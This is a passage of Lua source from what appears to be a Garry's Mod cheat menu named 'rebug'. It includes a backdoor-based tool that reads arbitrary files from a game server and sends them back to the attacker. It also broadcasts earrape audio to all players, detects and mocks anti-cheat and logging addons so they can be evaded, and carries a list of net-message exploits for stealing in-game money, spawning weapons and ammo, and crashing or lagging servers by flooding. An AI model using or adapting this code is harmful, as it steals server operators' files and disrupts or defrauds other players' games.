                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://tewtewqwef.000webhostapp.com/LilPumDRoseEarrape.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("Penis (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://rvac.cc/log1n/sound/penis.mp3" .. "\" , \"mono\", function() end)]])")
			end)

            rebug.AddButtonBIG("Pornhub Intro (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://rvac.cc/log1n/sound/pornhub.mp3" .. "\" , \"mono\", function() end)]])")
			end)

            rebug.AddButtonBIG("RamRanch (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://rvac.cc/log1n/sound/ramranch.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("SovietNationalAnthem (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://rvac.cc/log1n/soviet.mp3" .. "\" , \"mono\", function() end)]])")
            end)

            rebug.AddButtonBIG("Static (EarRape)", Bar7, function()
                surface.PlaySound("buttons/button18.wav")
                noob.PostLua("BroadcastLua([[sound.PlayURL(\"" .. "https://rvac.cc/log1n/sound/static.mp3" .. "\" , \"mono\", function() end)]])")
			end)

        end

/*
*	FileStealer( BD Required )
*/

        function filegrab()
            local filestealer = vgui.Create("DFrame")
            surface.PlaySound("buttons/blip1.wav")
            filestealer:SetSize(600, 150)
            filestealer:Center()
            filestealer:SetTitle("File Downloader ( Backdoor Required )")
            filestealer:MakePopup()
            filestealer:SetDraggable(true)

            filestealer.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(35, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(35, 35, 35, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local filePlate = vgui.Create('DPanelList', filestealer)
            filePlate:SetSize(590, 120)
            filePlate:SetPos(6, 27)

            filePlate.Paint = function(s, w, h)
                surface.SetDrawColor(Color(35, 35, 35))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(35, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(35, 35, 35, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local List8 = vgui.Create("DPanelList", filePlate)
            List8:SetPos(20, 13)
            List8:SetSize(550, 90)
            List8:SetName("")

            List8.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetMaterial(upgrad)
                surface.SetDrawColor(o_color2)
                surface.SetMaterial(downgrad)
                surface.SetDrawColor(o_color2)
                surface.SetDrawColor(21, 21, 21, 255)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            local item8 = vgui.Create("DPanelList", List8)
            item8:SetPos(10, 8)
            item8:SetSize(530, 75)
            item8:SetPadding(2)
            item8:SetSpacing(2)
            item8:EnableHorizontal(false)
            item8:EnableVerticalScrollbar(true)
            item8:SetName("")

            item8.Paint = function(self, w, h)
                surface.SetDrawColor(Color(30, 30, 30))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(21, 21, 21)
                surface.SetDrawColor(35, 35, 35, 0)
                surface.DrawOutlinedRect(0, 0, w, h)
            end

            function noob.OpenTextDocument(path, str, parent)
                local downloader = vgui.Create("DButton", item8)
                downloader:SetFont("Trebuchet18")
                downloader:SetText("File Downloader (Save)")
                downloader:SetTextColor(Color(255, 255, 255, 255))
                downloader:SetPos(2, 39)
                downloader:SetSize(525, 30)

                downloader.Paint = function(self, w, h)
                    surface.SetDrawColor(Color(30, 30, 30))
                    surface.DrawRect(0, 0, w, h)
                    surface.SetDrawColor(21, 21, 21)
                    surface.SetMaterial(upgrad)
                    surface.SetDrawColor(o_color2)
                    surface.SetMaterial(downgrad)
                    surface.SetDrawColor(o_color2)
                    surface.SetDrawColor(21, 21, 21, 255)
                    surface.DrawOutlinedRect(0, 0, w, h)
                end

                downloader.DoClick = function()
                    surface.PlaySound("buttons/button18.wav")

                    Derma_StringRequest("Save file " .. path .. "", "File name e.g: server.txt)", "", function(text)
                        if not string.find(text, ".txt") then
                            text = text .. ".txt"
                        end

                        if not file.IsDir("rebug/files/", "DATA") then
                            file.CreateDir("rebug/files/")
                        end

                        file.Write("rebug/files/" .. text, str)
                        noob.Notify("Saved source to data/rebug/files/" .. text)
                    end)
                end
            end

            rebug.AddButtonBIG("File Downloader", item8, function()
                surface.PlaySound("buttons/button18.wav")
                Derma_StringRequest("Steal File Source", "File Path (Relative to garrysmod/)", "", function(text)
                    net.Receive("file", function(len)
                        local str = net.ReadString()

                        if str ~= "ERROR" then
                            noob.OpenTextDocument(text, str, frame)
                        else
                            noob.Notify("Unable to find file " .. text .. " on the server")
                        end
                    end)

                    noob.PostLua([[
					
					util.AddNetworkString( "file" )
					local id = ]] .. LocalPlayer():UserID() .. [[
					local f = file.Open("]] .. text .. [[", "r", "GAME")

					if not f then
						net.Start("file")
						net.WriteString("ERROR")
						net.Send(Player(id))

						return
					end

					local str = f:Read(f:Size())
					f:Close()
					net.Start("file")
					net.WriteString(str)
					net.Send(Player(id))
					
				]])
                end)
            end)
        end

        local filegrabber = vgui.Create("DButton", VoidPlate)
        filegrabber:SetFont("Trebuchet18")
        filegrabber:SetText("File Download")
        filegrabber:SetTextColor(Color(255, 255, 255, 255))
        filegrabber:SetPos(235, 591)
        filegrabber:SetSize(180, 40)

        filegrabber.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        filegrabber.DoClick = function()
            filegrab()
            Void:SetVisible(false)
        end

/*
*	AntiCheat Detection
*/

            local acfags = {
                ["BetterSNTE Anti-Exploit"] = {
                    desc = "This was created shortly after SNTE became noticed to the pubic, This addon makes snte even \nmore useful but luckly for you are detour works on this addon (Don't scan backdoors)",
                    scan = function()
                        if file.Exists("epstat.lua", "LUA") or file.Exists("autorun/!!bettersnte.lua", "LUA") then
                            return true
                        end

                        return false
                    end
                },
                ["Cake Anti-Cheat (CAC)"] = {
                    desc = "One of the best anticheats ever created on gmod still bans kids for cheating after it \nwas removed from gmodstore in 2017. Pity it it was never made to detect backdoors.",
                    scan = function()
                        if _G.CAC then
                            return true
                        end
                        
                        return false
                    end
                },
                ["Quack Anti-Cheat (QAC)"] = {
                    desc = "This addon is a joke even when it was released in 2014 it didn't detect anything. \nStill to this day i question if it was actually meant to ban people.",
                    scan = function()
                        if _G.QAC then
                            return true
                        end
                        
                        return false
                    end
                },
                ["Simplac Anti-Cheat (SAC)"] = {
                    desc = "This anticheat became popular for less than a week then get detoured shortly after not only that this anticheat had an exploit to crash servers \nwhat a mess for simplac lol.",
                    scan = function()
                        if _G.simplicity then
                            return true
                        end
                        
                        return false
                    end
                },
                ["Cardinal Anti-Cheat"] = {
                    desc = "This anticheat works like a screengrab and it's detections won't detect anything including something like kone bypass or some other shit 2014 dll bypass. I also \nlike how this was made somewhere around 2018 but surely you can make something better than that.",
                    scan = function()
                        if file.Exists("sh_cardinal.lua","LUA") or file.Exists("client/cl_cardinal.lua","LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["CIB Anti-Exploit"] = {
                    desc = "This anticheat mainly bans people for putting certain words in console such as 'smeghack' or some old menu that has been out \nfor ages however i don't think they have insert key in there keywords.",
                    scan = function()
                        if file.Exists("cib/sh_config_cib.lua","LUA") or file.Exists("autorun/sh_start_cib.lua","LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["Nyaaa Anti-Exploit"] = {
                    desc = "From my understanding this addon was created to prevent people from backdooring and i can tell that this isn't popular and never will be \ni am fairly certain that this addon doesn't even detect anything.",
                    scan = function()
                        if file.Exists("autorun/ab.lua","LUA") or file.Exists("autorun/client/ab.lua","LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
				["Jenni Anti-Exploit"] = {
                    desc = "This is a worse version of SNTE, It would make 1 net string appear to those cheaters that have it in their list except rebug doesn't have 'anti_exploits_ban' \nin its list so no ban for you :)",
                    scan = function()
                        if file.Exists("autorun/client/cl_anti_exploits.lua","LUA") then
                             return true
                        end
                        
                        return false
                    end
                },
				["Telecomm Anti-Exploit"] = {
                    desc = "This is a copy of the addon 'betterSnte' it uses the same functionality as that addon, To me \ni find this pointless to use on a gmod server let alone rename the addon.(Don't scan backdoors)",
                    scan = function()
                        if file.Exists("autorun/client/cl_antinexploits.lua","LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["SNTE Anti-Exploit"] = {
                    desc = "This has been ruining skids for more than a year now. With our methods you can detour \nthis idiotic anti-cheat and not have a problem with it.",
                    scan = function()
                        if ConVarExists("snte_ulxluarun") or file.Exists("autorun/!!bettersnte.lua", "LUA") or file.Exists("autorun/!coresource_snte.lua", "LUA") or istable(global_nets) then -- if BetterSNTE then makes present
                            return true
                        end
                        
                        return false
                    end
                },
                ["Modern Anti-Cheat"] = {
                    desc = "This addon took ideas from snte and has a dhtml detection methods such as modules, \nLuckly for you WE are undetected from this shit.",
                    scan = function()
                        if file.Exists("autorun/client/!!!!!!!!!!!!!!!!!!!!!!aaaaaaaaaaa.lua", "LUA") or file.Exists("autorun/client/cl_mac.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["Swift Anti-Cheat"] = {
                    desc = "This is the worst anticheat that i have ever seen i used kone bypass and it didn't ban me \nlet alone use a backdoor what a joke of an addon.",
                    scan = function()
                        if file.Exists("swiftac.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["Umbrella Anti-Exploit"] = {
                    desc = "This was created by a bunch of retarded russians, you would have thought that they would have a brain for cheating \nin games but for gmod however they make something that is a copy of snte.",
                    scan = function()
                        if file.Exists("umbrella.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["Viper Anti-Exploit"] = {
                    desc = "This is shit anticheat was uploaded to a leaking website by some russian, this addon is complete shit doesn't even detect anything \ndon't bother get scared of this shit if you somehow find it on a server.",
                    scan = function()
                        if file.Exists("cl_viperbdcheck.lua", "LUA") or file.Exists("sh_viperbdcheck.lua", "LUA") or file.Exists("autorun/cl_viper.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["Raptor Anti-Exploit"] = {
                    desc = "This is a russian anticheat that is completly useless. It doesn't have anything inside that code that even detect kone bypass.\nDo not be feared by this addon.",
                    scan = function()
                        if file.Exists("autorun/client/cl_rac.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["C0nw0nk Anti-Cheat"] = {
                    desc = "This isn't a popular anticheat it has low detection methods the only thing that can catch you is the bhop \nbut ill be suprised if that actually works.",
                    scan = function() 
                        if file.Exists("autorun/send-lua-and-net-send.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["Prop Protection (SPC)"] = {
                    desc = "GmodStore paid addon, This will prevent you from prop killing an`d prop climbing. \nThis will irritate you if you were planing on prop killing",
                    scan = function()
                        if file.Exists("autorun/smartsauce_loader.lua", "LUA") or file.Exists("autorun/smartsauce/sv_main.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["Spawn Protection (SZ)"] = {
                    desc = "GmodStore paid spawn protection an addon that has been around for some time and is still \na popular addon to lots of people including me",
                    scan = function()
                        if file.Exists("sz_config.lua", "LUA") or file.Exists("autorun/autorun_safezones.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["Screengrab Anti-Cheat"] = {
                    desc = "This is an addon that has been catching skids out for a while, most wonder how admins see \nthere shitty wall hacks except rebug doesn't have any",
                    scan = function()
                        if file.Exists("cl_screengrab.lua", "LUA") or file.Exists("autorun/sh_screengrab.lua", "LUA") or file.Exists("autorun/sh_screengrab_v2.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["BLogs Logging System"] = {
                    desc = "One of the best logging systems added to gmod since release, it has lots of logging features \nincluding live feed which has been useful for lots of servers( Be careful )",
                    scan = function()
                        if file.Exists("gmodadminsuite/modules/logging/cl_menu.lua", "LUA") or file.Exists("vgui/gas_logging_advanced_search_item.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["Billys Admin Sits"] = {
                    desc = "This addon is used for admins on servers to handle sits. It does however come with a \nscreengrab which we are not sure if it can see rebug so be careful",
                    scan = function()
                        if file.Exists("gmodadminsuite/modules/adminsits/sv_adminsits.lua", "LUA") or file.Exists("gmodadminsuite/modules/adminsits/sh_sit_behaviour.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["MLogs Logging System"] = {
                    desc = "Quite a decent logging system i have been told, This addon logs lots of things im not sure \nthat it logs the same or more than blogs",
                    scan = function()
                        if file.Exists("mlib/lua/autorun/mlib.lua", "LUA") or file.Exists("mlogs2/lua/mlogs/config/cl_config", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["PLogs Logging System"] = {
                    desc = "Used to be a paid gmodstore addon BUT now is on github for lack of updates, This was a shit addon anyways \ndoesn't surprise me that its on github now lol.",
                    scan = function()
                        if file.Exists("plogs_cfg.lua", "LUA") or file.Exists("plogs_mysql_cfg.lua", "LUA") or file.Exists("autorun/plogs_init.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["AWarn2 Warning System"] = {
                    desc = "Gmodstore addon that is still popular to this day, You will likely find this\n on any server you join tbh",
                    scan = function()
                        if file.Exists("autorun/sh_awarn.lua", "LUA") or file.Exists("autorun/sh_localization.lua", "LUA") or file.Exists("autorun/client/cl_awarn_newmenu.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["AWarn3 Warning System"] = {
                    desc = "A recently made gmodstore addon and has became quiet popular with 300 downloads already,\n this will most likely start to be on most servers you join",
                    scan = function()
                        if file.Exists("autorun/awarn3.lua", "LUA") or file.Exists("includes/awarn3_blacklists.lua", "LUA") or file.Exists("includes/awarn3_permissions.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
                ["LUA Stealer (Void)"] = {
                    desc = "This is one of my creation, It is able to download the source code to your lua scripts from \nyou just pressing a button. This is a good addon yesss :)",
                    scan = function()
                        if file.Exists("autorun/sh_fuckthissheet.lua", "LUA") then
                            return true
                        end
                        
                        return false
                    end
                },
            }

        function anticheats()
            local acpanel = vgui.Create("DFrame")
            if not acpanel then return end
            acpanel:SetSize(500, 455)
            acpanel:SetTitle("Security measures for the server")
            acpanel:Center()
            acpanel:MakePopup()

            acpanel.Paint = function(s, w, h)
                surface.SetDrawColor(Color(30, 30, 30, 255))
                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(Color(55, 55, 55, 255))
                surface.DrawOutlinedRect(0, 0, w, h)
                surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
                surface.SetDrawColor(Color(33, 33, 33, 200))
                surface.DrawRect(10, 25, w - 20, h - 35)
            end

            local Plist = vgui.Create("DPanelList", acpanel)
            Plist:SetSize(acpanel:GetWide() - 20, acpanel:GetTall() - 35)
            Plist:SetPadding(5)
            Plist:SetSpacing(5)
            Plist:EnableHorizontal(false)
            Plist:EnableVerticalScrollbar(true)
            Plist:SetPos(10, 25)
            Plist:SetName("")

            local function CreateACPanel(cmd)
                if not acpanel then return end
                local cmdp = vgui.Create("DPanel")
                cmdp:SetSize(Plist:GetWide(), 60)
                cmdp.Cmd = cmd
                cmdp.Desc = acfags[cmd].desc

                cmdp.Paint = function(s, w, h)
                    surface.SetDrawColor(Color(50, 50, 50, 255))
                    surface.DrawRect(0, 0, w, h)
                    surface.SetDrawColor(Color(65, 65, 65, 255))
                    surface.DrawOutlinedRect(0, 0, w, h)
                    surface.DrawLine(0, 24, w, 24)
                    draw.DrawText(cmdp.Cmd, "DermaDefault", 10, 5, Color(255, 255, 255))
                    draw.DrawText(cmdp.Desc, "DermaDefault", 10, 28, Color(205, 205, 255, 100))
                end

                Plist:AddItem(cmdp)
            end

            for k, v in pairs(acfags) do
                if v["scan"]() then
                    CreateACPanel(k)
                end
            end
        end

        local anticheat = vgui.Create("DButton", VoidPlate)
        anticheat:SetFont("Trebuchet18")
        anticheat:SetText("AntiCheats")
        anticheat:SetTextColor(Color(255, 255, 255, 255))
        anticheat:SetPos(473, 591)
        anticheat:SetSize(180, 40)

        anticheat.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        anticheat.DoClick = function()
		surface.PlaySound("buttons/button18.wav")
            anticheats()
            Void:SetVisible(false)
        end

/*
*	Server Exploitation
*/

		local isstring = isstring

		rebug.sploits = {}
		rebug.memory = {}

		local severitycols = {
			[1] = Color( 80, 80, 120 ),
			[2] = Color( 83, 181, 83 ),
			[3] = Color( 150, 90, 50 ),
			[4] = Color( 150, 0, 0),
		}

		function rebug.AddExploit( name, tab )
			if !isstring( name ) then print("U FUCKED UP A SPLOIT RETARD") return end
			if !istable( tab ) then print("U FUCKED UP A SPLOIT RETARD") return end
			rebug.sploits[name] = tab
		end

		function rebug.IsStored( addr )
			return rebug.memory[addr] != nil
		end



		function rebug.GetStored( addr, fallback )
			if fallback and rebug.memory[addr] == nil then return fallback end
			return rebug.memory[addr]
		end

		function rebug.Store( addr, val )
			rebug.memory[addr] = val
		end

		function rebug.GetAllStored()
			return rebug.memory
		end



		function rebug.GetAllStoredData()
			local ret = {}
			for k, v in pairs( rebug.memory ) do
				if !istable( v ) then ret[k] = v end
			end
			return ret
		end

/*
*	EXPLOIT FEATURES
*/
			rebug.AddExploit("€ Bitminers2 €", {
				desc = "Exploit to steal money from all bitminers",
				severity = 2,
				scan = function() return CheckIfStringExists("BM2.Command.SellBitcoins") end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
							for k, v in pairs(ents.FindByClass("bm2_bitminer_1")) do
								net.Start("BM2.Command.SellBitcoins")
								net.WriteEntity(v)
								net.SendToServer()
							end

							for k, v in pairs(ents.FindByClass("bm2_bitminer_2")) do
								net.Start("BM2.Command.SellBitcoins")
								net.WriteEntity(v)
								net.SendToServer()
							end

							for k, v in pairs(ents.FindByClass("bm2_bitminer_rack")) do
								net.Start("BM2.Command.SellBitcoins")
								net.WriteEntity(v)
								net.SendToServer()
							end
						end
					},
				}
			})
			rebug.AddExploit("€ Customizable Printers Money Stealer €", {
				desc = "Exploit to steal money from all Customizable printers",
				severity = 2,
				scan = function() return CheckIfStringExists( "SyncPrinterButtons16690" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							for k, v in pairs(ents.GetAll()) do
								if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
									net.Start("SyncPrinterButtons16690")
									net.WriteEntity(v)
									net.WriteUInt(2, 4)
									net.SendToServer()
								end
							end
						end
					},
				}
			})
			rebug.AddExploit("€ gPrinter Money Stealer €", {
				desc = "Exploit to steal money from gprinters",
				severity = 2,
				scan = function() return CheckIfStringExists( "gPrinters.retrieveMoney" ) and CheckIfStringExists( "gPrinters.addUpgrade" ) and CheckIfStringExists( "gPrinters.chat" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							for k, v in pairs(ents.GetAll()) do
								net.Start("gPrinters.retrieveMoney")
								net.WriteEntity(v)
								net.SendToServer()
							end
						end
					},
				}
			})
			rebug.AddExploit("€ Derma Printers €", {
				desc = "Exploit to steal money from all derma printers",
				severity = 2,
				scan = function() return CheckIfStringExists( "withdrawp" ) and CheckIfStringExists( "RechargeP" ) and CheckIfStringExists( "CoolingP" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							for k, v in pairs(entsFindByClass("derma_printer")) do
								net.Start("withdrawp")
								net.WriteEntity(v)
								net.SendToServer()
							end
						end
					},
				}
			})
			rebug.AddExploit("Give weapons", {
				desc = "Give some weapons for you (enter type)",
				severity = 3,
				scan = function() return CheckIfStringExists( "CraftSomething" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							net.Start( "CraftSomething" )
							net.WriteEntity( LocalPlayer() )
							net.WriteString( typ )
							net.WriteString( "" )
							net.WriteString( typ )
							net.SendToServer()
						end
					},
				}
			})
			rebug.AddExploit("Inf Ammo", {
				desc = "This will give you infinate ammo",
				severity = 3,
				scan = function() return CheckIfStringExists( "TCBBuyAmmo" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							net.Start( "TCBBuyAmmo" )
							net.WriteTable( {nil,LocalPlayer():GetActiveWeapon():GetPrimaryAmmoType(),nil,"0","999999"} )
							net.SendToServer()
						end
					},
				}
			})
			rebug.AddExploit("Keypad Hack", {
				desc = "Opens all keypads in the area ( works every 80s )",
				severity = 3,
				scan = function() return CheckIfStringExists( "start_wd_emp" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							net.Start( "start_wd_emp" )
							net.SendToServer()
						end
					},
				}
			})
			rebug.AddExploit("Remove Money", {
				desc = "This will strip the weapons from all players",
				severity = 4,
				scan = function() return CheckIfStringExists( "drugs_money" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							net.Start( "drugs_money" )
							net.SendToServer()
						end
					},
				}
			})
			rebug.AddExploit("Server Crasher #1", {
				desc = "This will use simplac AC to crash the server",
				severity = 4,
				scan = function() return CheckIfStringExists( "SimplicityAC_aysent" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							net.Start( "SimplicityAC_aysent" )
							net.SendToServer()
						end
					},
				}
			})
			rebug.AddExploit("Server Crasher #1", {
				desc = "This will use simplac AC to crash the server",
				severity = 4,
				scan = function() return CheckIfStringExists( "SimplicityAC_aysent" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							net.Start( "SimplicityAC_aysent" )
							net.SendToServer()
						end
					},
				}
			})
			rebug.AddExploit("Server Crasher #2", {
				desc = "This will use StaffTracker to crash the server",
				severity = 4,
				scan = function() return CheckIfStringExists( "Morpheus.StaffTracker" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							if not timer.Exists("crasher1") then
								timer.Create("crasher1", 0.5, 0, function()
									for i = 1, 2000 do
										net.Start("Morpheus.StaffTracker")
										net.SendToServer()
									end
								end)
							else
								timer.Remove("crasher1")
							end
						end
					},
				}
			})
			rebug.AddExploit("Server Crasher #3", {
				desc = "This will use PAC net to crash the server",
				severity = 4,
				scan = function() return CheckIfStringExists( "pac.net.TouchFlexes.ClientNotify" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							if not timer.Exists("pac.net.TouchFlexes.ClientNotify") then
								timer.Create("pac.net.TouchFlexes.ClientNotify", 0.5, 0, function()
									for i = 1, 2000 do
										net.Start("pac.net.TouchFlexes.ClientNotify")
										net.SendToServer()
									end
								end)
							else
								timer.Remove("pac.net.TouchFlexes.ClientNotify")
							end
						end
					},
				}
			})
			rebug.AddExploit("Lagger #1", {
				desc = "This will use NDES to lag the server",
				severity = 4,
				scan = function() return CheckIfStringExists( "NDES_SelectedEmblem" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							if not timer.Exists("NDES_SelectedEmblem") then
								timer.Create("NDES_SelectedEmblem", 0.5, 0, function()
									for i = 1, 2000 do
										net.Start("NDES_SelectedEmblem")
										net.SendToServer()
									end
								end)
							else
								timer.Remove("NDES_SelectedEmblem")
							end
						end
					},
				}
			})
			rebug.AddExploit("Lagger #2", {
				desc = "This will use EZS PlayerTag to lag the server",
				severity = 4,
				scan = function() return CheckIfStringExists( "EZS_PlayerTag" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							if not timer.Exists("EZS_PlayerTag") then
								timer.Create("EZS_PlayerTag", 0.5, 0, function()
									for i = 1, 2000 do
										net.Start("EZS_PlayerTag")
										net.SendToServer()
									end
								end)
							else
								timer.Remove("EZS_PlayerTag")
							end
						end
					},
				}
			})
			rebug.AddExploit("Lagger #3", {
				desc = "This will use bitminers2 to lag the server",
				severity = 4,
				scan = function() return CheckIfStringExists( "BM2.Command.Eject" ) end,
				functions = {
					{
						typ = "func",
						name = "Launch",
						func = function()
						surface.PlaySound("buttons/button18.wav")
							if not timer.Exists("BM2.Command.Eject") then
								timer.Create("BM2.Command.Eject", 0.5, 0, function()
									for i = 1, 2000 do
										net.Start("BM2.Command.Eject")
										net.SendToServer()
									end
								end)
							else
								timer.Remove("BM2.Command.Eject")
							end
						end
					},
				}
			})

	// Rest of exploit page
	
	function exploitation()

		function rebug.MakeFunctionButton(parent, x, y, btext, func, tooltip)
			if not parent:IsValid() then return end
			local TButton = vgui.Create("DButton")
			TButton:SetParent(parent)
			TButton:SetPos(x, y)
			TButton:SetText(btext)
			TButton:SetTextColor(Color(255, 255, 255, 255))
			TButton:SizeToContents()
			TButton:SetTall(24)

			if tooltip then
				TButton:SetToolTip(tooltip)
			end

			TButton.Paint = function(self, w, h)
				surface.SetDrawColor(Color(60, 60, 60, 200))
				surface.DrawRect(0, 0, w, h)
				surface.SetDrawColor(Color(60, 60, 60))
				surface.SetMaterial(downgrad)
				surface.DrawTexturedRect(0, 0, w, h / 2)
				surface.SetDrawColor(Color(100, 100, 100, 255))
				surface.DrawOutlinedRect(0, 0, w, h)
			end

			TButton.DoClick = function()
				func()
			end

			return TButton:GetWide(), TButton:GetTall()
		end

		function rebug.MakePlayerSelectionButton(parent, x, y, addr)
    if not parent:IsValid() then return end
			local TButton = vgui.Create("DButton")
			TButton:SetParent(parent)
			TButton:SetPos(x, y)
			TButton:SetText("Choose Targets")
			TButton:SetTextColor(Color(255, 255, 255, 255))
			TButton:SizeToContents()
			TButton:SetTall(24)

			TButton.Paint = function(self, w, h)
				surface.SetDrawColor(Color(60, 60, 90, 200))
				surface.DrawRect(0, 0, w, h)
				surface.SetDrawColor(Color(60, 60, 60))
				surface.SetMaterial(downgrad)
				surface.DrawTexturedRect(0, 0, w, h / 2)
				surface.SetDrawColor(Color(100, 100, 100, 255))
				surface.DrawOutlinedRect(0, 0, w, h)
				surface.SetDrawColor(Color(70, 70, 100, 255))
				surface.DrawOutlinedRect(2, 2, w - 4, h - 4)
			end

			TButton.DoClick = function()
				rebug.SelectPlayersPanel(addr)
			end

			return TButton:GetWide(), TButton:GetTall()
		end

		function rebug.SelectPlayersPanel(addr)
			if rebug.PlayerSelector and rebug.PlayerSelector:IsVisible() then
				rebug.PlayerSelector:Remove()
			end

			local plytab = rebug.GetStored(addr, {})
			rebug.PlayerSelector = vgui.Create("DFrame")
			rebug.PlayerSelector:SetSize(250, 400)
			rebug.PlayerSelector:SetTitle("Select players to target")
			rebug.PlayerSelector:SetPos(gui.MouseX(), gui.MouseY())
			rebug.PlayerSelector:MakePopup()

			rebug.PlayerSelector.Paint = function(s, w, h)
				if not rebug.Menu or not rebug.Menu:IsVisible() then
					s:Remove()

					return
				end

				surface.SetDrawColor(Color(30, 30, 30, 245))
				surface.DrawRect(0, 0, w, h)
				surface.SetDrawColor(Color(55, 55, 55, 245))
				surface.DrawOutlinedRect(0, 0, w, h)
				surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
			end

			local Plist11 = vgui.Create("DPanelList", rebug.PlayerSelector)
			Plist11:SetSize(rebug.PlayerSelector:GetWide() - 10, rebug.PlayerSelector:GetTall() - 55)
			Plist11:SetPadding(5)
			Plist11:SetSpacing(5)
			Plist11:EnableHorizontal(false)
			Plist11:EnableVerticalScrollbar(true)
			Plist11:SetPos(5, 40)
			Plist11:SetName("")

			local target1 = vgui.Create("DButton", rebug.PlayerSelector)
			target1:SetSize(40, 20)
			target1:SetPos(10, 23)
			target1:SetText("All")
			target1:SetTextColor(Color(255, 255, 255, 255))

			target1.Paint = function(panel, w, h)
				surface.SetDrawColor(100, 100, 100, 255)
				surface.DrawOutlinedRect(0, 0, w, h)
				surface.SetDrawColor(0, 0, 50, 155)
				surface.DrawRect(0, 0, w, h)
			end

			target1.DoClick = function()
				for _, p in pairs(player.GetAll()) do
					if not table.HasValue(plytab, p) then
						table.insert(plytab, p)
					end
				end

				rebug.Store(addr, plytab)
			end

